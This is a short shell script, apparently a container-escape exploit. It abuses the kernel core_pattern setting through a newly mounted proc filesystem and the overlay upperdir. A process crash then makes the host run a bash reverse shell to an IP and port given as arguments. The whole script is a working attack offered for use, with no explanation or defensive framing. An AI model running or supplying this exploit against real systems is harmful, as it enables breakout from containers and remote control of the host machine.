#!/bin/sh

#argv $1 e' ip_addr
#argv $2 e' port
mkdir /newproc
mount -t proc proc /newproc
UPPERDIR=$(cat /etc/mtab | grep overlay | awk -F "," '{ for (i=1; i<=NF; i++) { if ($i ~ /upperdir/) { print $i } } }' | cut -d "=" -f 2)
echo "#!/bin/bash" > /cmd
echo "/bin/bash -i >& /dev/tcp/$1/$2 0>&1" >> /cmd
chmod 777 /cmd
echo "|$UPPERDIR/cmd" > /newproc/sys/kernel/core_pattern
./crash
